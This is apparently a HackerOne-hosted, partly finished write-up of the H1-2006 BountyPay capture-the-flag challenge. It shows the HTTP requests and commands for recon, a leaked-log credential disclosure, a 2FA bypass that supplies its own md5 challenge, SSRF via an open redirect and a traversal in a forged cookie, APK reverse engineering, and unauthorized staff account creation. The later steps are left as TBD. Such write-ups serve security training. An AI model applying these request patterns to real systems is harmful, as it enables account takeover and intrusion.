{"id":894623,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ2MjM=","url":"https://hackerone.com/reports/894623","title":"@shakedko H1-2006 CTF writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-09T17:23:53.886Z","submitted_at":"2020-06-09T17:23:53.886Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"shakedko","url":"/shakedko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-06T16:02:31.016Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-06-19T16:11:07.639Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## TL;DR\n\nFlag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.\n\nThank you for this awesome challenge! \n\n## Introduction\n\nI have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short time. \n\nComing from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.\n\n## Tools \n\nI have used several tools during this process. You may find these tools in the following links:\n\n- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.\n- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/). \n- [dex2jar](https://github.com/pxb1988/dex2jar)\n- [JD-GUI](http://java-decompiler.github.io/)\n- Android Studio\n- ngrok \n- [findomain](https://github.com/Edu4rdSHL/findomain)\n\n## Description \n\nHackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: \n\n\u003e We need your help! CEO \n@martenmickos\n needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf \n\nThis meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step,as  I knew that I was on the right track but there was still something to be found. \n\n## Steps\n\n\n- Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery)\n- Open Redirect\n- Information Disclosure (Log File)\n- Improper Authorization\n- SSRF\n- Information Disclosure (Directory Listing, In-house APK)\n- Reverse Enginerring (APK)\n- Information Disclosure (Twitter Account)\n- Authentication Bypass (Creating Sandra's user)\n- CSRF\n- Parameter Pollution\n- Privilege Escalation via CSRF\n- Information Disclosure (CEO username \u0026 password)\n- SSRF\n- CSS Keylogger via SSRF\n\n### Step 1 - Reconnaissance \n\n#### Subdomain Enumartion\n\nThe scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:\n\n```\n$ findomain -t bountypay.h1ctf.com\n\nTarget ==\u003e bountypay.h1ctf.com\n\nSearching in the Facebook API... üîç\nSearching in the Bufferover API... üîç\nSearching in the Threatminer API... üîç\nSearching in the AnubisDB API... üîç\nSearching in the CertSpotter API... üîç\nSearching in the Urlscan.io API... üîç\nSearching in the Threatcrowd API... üîç\nSearching in the Crtsh database API... üîç\nSearching in the Virustotal API... üîç\nSearching in the Sublist3r API... üîç\nSearching in the Spyse API... üîç\n\nstaff.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nbountypay.h1ctf.com\n\nA total of 6 subdomains were found for domain bountypay.h1ctf.com üëΩ in 2 seconds.‚è≤Ô∏è\n\nGood luck Hax0r üíÄ!\n```\n\n#### Understanding the Application \n\nI hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  \n\n#### Content Discovery\n\nAfter learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: \n\n- GET https://app.bountypay.h1ctf.com/cgit \n- GET https://app.bountypay.h1ctf.com/.git\n- GET https://api.bountypay.h1ctf.com/api\n- GET https://api.bountypay.h1ctf.com/api/staff\n- GET https://api.bountypay.h1ctf.com//api/accounts/\u003cword\u003e\n\n### Step 2 - Open Redirect\n\nWhile doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon\n\n#### Step 3 - Information Disclosure (Log File)\n\nScanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: \n\n```\ncat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'\n{\n  \"input\": {\n    \"FUZZ\": \"config\"\n  },\n  \"position\": 97,\n  \"status\": 200,\n  \"length\": 278,\n  \"words\": 19,\n  \"lines\": 12,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/config\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"index\"\n  },\n  \"position\": 20,\n  \"status\": 200,\n  \"length\": 0,\n  \"words\": 1,\n  \"lines\": 1,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/index\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"description\"\n  },\n  \"position\": 3838,\n  \"status\": 200,\n  \"length\": 73,\n  \"words\": 10,\n  \"lines\": 2,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/description\"\n}\n```\n\nLooking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php]() that showed me the way to the next step: \n\n```\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n````\n\n[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: \n\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nEncoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: \n\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\n### Step 4 - Improper Authorization\n\nOnce I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. \n\nLooking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:\n\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Length: 101\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=c4ca4238a0b923820dcc509a6f75849b\u0026challenge_answer=1\n```\n\nand the response: \n\n```\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:14:12 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000\nLocation: /\nContent-Length: 0\n```\n\nUsing this new cookie, I was logged in as Brian Oliver.\n\n### Step 5 - SSRF\n\nAfter I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. \n\nI looked into the request and I saw that it was doing the following request: \n\n```\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,he;q=0.8\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n```\n\nWhile returning the following response:\n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:17:38 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nAt that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. \n\nThe cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` \nDecoded: `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` \n\nConsidering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. \n\nI created a new cookie: `{\"account_id\":\"../../redirect?url=FUZZ\u0026\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: \n\n1. Known words and files\n2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. \n\nPutting everything together, I found a directory listing while fuzzing which leads me to the next step \n\n### Step 6 - Information Disclosure (Directory Listing, In-house APK)\n\nAs mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: \n\n```\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n\n```\n\nand it's response gave me the hint for the next step: \n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:27:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 491\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/uploads\\/\u0026\\/statements?month=01\u0026year=2020\",\"data\":\"\u003chtml\u003e\\n\u003chead\u003e\u003ctitle\u003eIndex of \\/uploads\\/\u003c\\/title\u003e\u003c\\/head\u003e\\n\u003cbody bgcolor=\\\"white\\\"\u003e\\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e                                        20-Apr-2020 11:26              4043701\\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\\n\u003c\\/html\u003e\\n\"}\n```\n\nLooking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. \n\n### Step 7 - Reverse Enginerring (APK)\n\nWhen I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. \n\nIn this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. \n\nOnce I had the code, I ran the APK using Android Studio's \"Profile or debug APK\". \n\nThere are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: \n\n- one://part\n- two://part\n- three://part\n\nEach part had a required URI with different parameters that were available in the code. \n\nIn order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` \n\n![APK-1 screenshot]\n\nI figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: \n\n```\n    if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n      String str = getIntent().getData().getQueryParameter(\"start\");\n      if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n        ...\n        startActivity(new Intent((Context)this, PartTwoActivity.class));\n      } \n    } \n```\n\nOnce I was on the second Activity, I saw in the code that all inputs where invsible:\n\n```\n    EditText editText = (EditText)findViewById(2131230834);\n    Button button = (Button)findViewById(2131230794);\n    TextView textView = (TextView)findViewById(2131231002);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    textView.setVisibility(4\n```\n\nand all I had to do in order to make them visible was figuring out the params within the URL: \n\n```\n      Uri uri = getIntent().getData();\n      String str1 = uri.getQueryParameter(\"two\");\n      String str2 = uri.getQueryParameter(\"switch\");\n      if (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n        editText.setVisibility(0);\n        button.setVisibility(0);\n        textView.setVisibility(0);\n      } \n```\n\nTherefore, the URL was: `two://part?two=light\u0026switch=on`. This resulted with a hash, an input field which asked for a header name. \n\n![Apk-2 Screenshot]\n\nWhile doing some recon, I already saw a suspicious base64 code in the 3rd Activity:\n\n```\n  byte[] decodedDirectory = Base64.decode(\"aG9zdA==\", 0);\n  \n  byte[] decodedDirectoryTwo = Base64.decode(\"WC1Ub2tlbg==\", 0);\n  \n  final String directory = \"aG9zdA==\";\n  \n  final String directoryTwo = \"WC1Ub2tlbg==\";\n  \n  final String headerDirectory = \"header\";\n````\n\nDecoding both resulted with the following strings: \n\n```\n$ \"WC1Ub2tlbg==\" | base64 -d\nX-Token: \n$ \"aG9zdA==\" | base64 -d\nhost\n```\n\nUsing the `X-Token` header I got to the 3rd Activity, which again had insvisible components: \n\n```\nprotected void onCreate(Bundle paramBundle) {\n    ...\n    final EditText editText = (EditText)findViewById(2131230837);\n    final Button button = (Button)findViewById(2131230796);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    ...\n```\n\nLooking into the code, I saw that there was an HTTP rqeuest that was supposed to be fired once everything had been loaded correctly: \n\n```\n    this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n            public void onCancelled(DatabaseError param1DatabaseError) {\n              Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n            }\n            \n            public void onDataChange(DataSnapshot param1DataSnapshot) {\n              String str = (String)param1DataSnapshot.getValue();\n              if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n                String str1 = thirdParam;\n                if (str1 != null) {\n                  StringBuilder stringBuilder = new StringBuilder();\n                  stringBuilder.append(\"X-\");\n                  stringBuilder.append(str);\n                  if (str1.equals(stringBuilder.toString())) {\n                    editText.setVisibility(0);\n                    button.setVisibility(0);\n                    PartThreeActivity.this.thread.start();\n                  } \n                } \n              } \n            }\n          });\n    }\n```\n\nUsing the following URL: `three://part?switch=b24%3D\u0026three=UGFydFRocmVlQWN0aXZpdHk%3D\u0026header=X-Token` I was able to execute this code\n\n![Apk-3 Screenshot]\n\nI got the `HOST` header and the `X-Token` header in Android Studio's Logcat\n\n```\n2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST¬†IS:: http://api.bountypay.h1ctf.com\n2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN¬†IS:: 8e9998ee3137ca9ade8f372739f062c1\n2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER¬†VALUE¬†AND¬†HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n![Logcat Screenshot]\n\nIt's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. \n\nThe last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: \n\n1. There's a POST request to the exposed host, but something is missing. \n2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.\n\n### Step 8 - Information Disclosure (Twitter Account)\n\nBountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: \nhttps://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\n\n[Sandra's screenshot]\n\n### Step 9 - Authentication Bypass (Creating Sandra's user)\n\nAfter I saw APK POST request, host, X-Token I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test. \n\nClearly, as Sandra was part of the staff, I first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: \n\n```\nGET /api/staff? HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n```\n\nResponse\n```\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n````\n\nAfter I saw this, I tried to do the same with the following POST request: \n\n```\nPOST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:84DJKEIP38\n```\n\nBut that resutled with the following reponse: \n\n```\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 13:15:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\n\nNow I went back to Sandra's id and tried her `staff_id`: \n\n```\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\u0026staff_name=1\n```\n\nResponse:\n\n```\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 19:42:33 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n### Step 10 - CSRF\n\nTBD \n### Step 11 - Parameter Pollution\nTBD \n### Step 12 - Privilege Escalation via CSRF\nTBD \n### Step 13 - Information Disclosure (CEO username \u0026 password)\nTBD \n### Step 14 - SSRF\nTBD \n### Step 15 - CSS Keylogger via SSRF\nTBD \n\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\n\n## Impact\n\nTBD","original_report_id":null,"original_report_url":null,"attachments":[{"id":861010,"file_name":"apk-logcat.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ke12KSbVEVXy7hbK6kGwgk6Q?response-content-disposition=attachment%3B%20filename%3D%22apk-logcat.png%22%3B%20filename%2A%3DUTF-8%27%27apk-logcat.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=07e3ec6b83784b608ddd012f3964da74733d34be4f0a8fb26123c9720bbf9f70","file_size":150832,"type":"image/png"},{"id":861011,"file_name":"apk-part-1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i5kLfwqWTs6jdUy8n2UVk5qj?response-content-disposition=attachment%3B%20filename%3D%22apk-part-1.png%22%3B%20filename%2A%3DUTF-8%27%27apk-part-1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmj